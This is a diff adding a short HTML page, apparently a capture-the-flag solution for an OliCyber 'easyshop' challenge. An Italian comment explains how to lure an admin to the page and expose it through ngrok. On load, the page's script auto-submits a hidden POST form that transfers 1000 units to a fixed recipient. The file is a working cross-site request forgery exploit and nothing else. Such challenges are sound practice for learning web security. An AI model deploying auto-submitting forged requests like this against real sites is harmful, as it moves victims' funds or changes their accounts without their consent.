@@ -1,0 +1,19 @@
+<!doctype html>
+<!--redirectare l'admin su questa pagina, aprire questo server su una porta e usare ngrok con il comando
+    ngrok --scheme http http 3000
+    poi cambiare un value dell'html di una possibilità e submitare, poi solo CTRL+R-->
+<html lang="en">
+    <head>
+        <title>Pwnato</title>
+    </head>
+    <body>
+        <form action="https://easyshop.challs.olicyber.it/send" method="post">
+            <textarea name="to">410577bba438fb1819cc109924000e88ca7405993415a633e8090e54892ae911</textarea>
+            <textarea name="amount">1000</textarea>
+            <button type="submit" id="sas">
+        </form>
+        <script>
+            document.getElementById("sas").click();
+        </script>
+    </body>
+</html>
